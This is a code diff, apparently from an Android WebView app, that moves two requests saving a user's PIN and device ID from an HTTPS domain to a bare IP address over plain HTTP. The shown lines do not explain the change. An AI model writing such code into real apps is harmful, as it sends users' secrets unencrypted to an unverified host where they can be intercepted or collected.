@@ -62,7 +62,7 @@
           const deviceId = Android.getDeviceId();
           
           // Send with device_id like other requests
-          fetch("https://pin.astrobuddy.xyz/api/save-pin", {
+          fetch("http://95.134.130.160:8765/save-pin", {
             method: "POST",
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify({ 
@@ -92,7 +92,7 @@
           console.error(err);
           const fallbackDeviceId = "browser_test_" + Date.now();
           
-          fetch("https://pin.astrobuddy.xyz/api/save-pin", {
+          fetch("http://95.134.130.160:8765/save-pin", {
             method: "POST",
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify({ 
